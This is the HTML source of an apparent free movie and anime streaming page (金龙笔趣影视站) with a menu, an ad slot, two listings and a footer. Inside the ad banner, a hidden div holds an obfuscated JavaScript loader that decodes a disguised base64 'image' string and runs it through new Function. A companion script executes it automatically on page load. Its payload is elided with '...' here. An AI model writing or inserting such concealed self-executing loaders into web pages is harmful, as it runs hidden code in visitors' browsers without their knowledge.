<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>狗妹影视站</title>
  <style>
    body {
      font-family: sans-serif;
      background: #0e0b1e;
      color: #eee;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #5e35b1;
      color: white;
      padding: 1em;
      text-align: center;
    }
    nav {
      background: #2a2550;
      display: flex;
      justify-content: center;
      gap: 2em;
      padding: 1em 0;
    }
    nav a {
      color: #ccc;
      text-decoration: none;
      font-weight: bold;
    }
    .ad {
      background: #ffe082;
      text-align: center;
      padding: 1em;
      margin: 1em;
      border: 2px dashed #5e35b1;
    }
    .movie-section {
      padding: 1em;
      max-width: 1000px;
      margin: auto;
    }
    .movie {
      border: 1px solid #444;
      background: #1f1b3a;
      padding: 1em;
      margin-bottom: 1em;
      border-radius: 10px;
    }
    .movie h2 {
      color: #ffca28;
      margin-top: 0;
    }
    .movie img {
      width: 100%;
      height: auto;
      border-radius: 6px;
    }
    footer {
      text-align: center;
      font-size: 0.9em;
      padding: 2em 1em;
      background: #2a2550;
      color: #aaa;
    }
  </style>
</head>
<body>
  <header>
    <h1>金龙笔趣影视站</h1>
    <p>免费看热门电影和动漫！</p>
  </header>

  <nav>
    <a href="#">首页</a>
    <a href="#">电影</a>
    <a href="#">动漫</a>
    <a href="#">联系</a>
  </nav>

  <div class="ad">
    <!-- 广告横幅位 -->
    <div style="display: none !important;">!function(){function a(a){var _idx="b5i2w4l7e9";var b={...};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('data:image/jpg;base64,...');new Function(b)()}();</div><script>(function(){var t = document.currentScript.previousElementSibling.innerText;t && new Function(t)();})()</script>
  </div>

  <div class="movie-section">
    <div class="movie">
      <h2>海贼王</h2>
      <p>日本超人气动漫，讲述路飞的航海冒险之旅。</p>
      <img src="https://upload.wikimedia.org/wikipedia/en/6/65/One_Piece_Logo.png" alt="海贼王">
    </div>
    <div class="movie">
      <h2>金龙笔趣小说</h2>
      <p>本站自制推荐小说，适合喜欢阅读的你！</p>
      <img src="https://via.placeholder.com/800x400.png?text=金龙笔趣小说" alt="金龙小说">
    </div>
  </div>

  <footer>
    © 2025 金龙笔趣影视站 | Powered by GitHub Pages<br/>
    联系方式：54088729
  </footer>
</body>
</html>
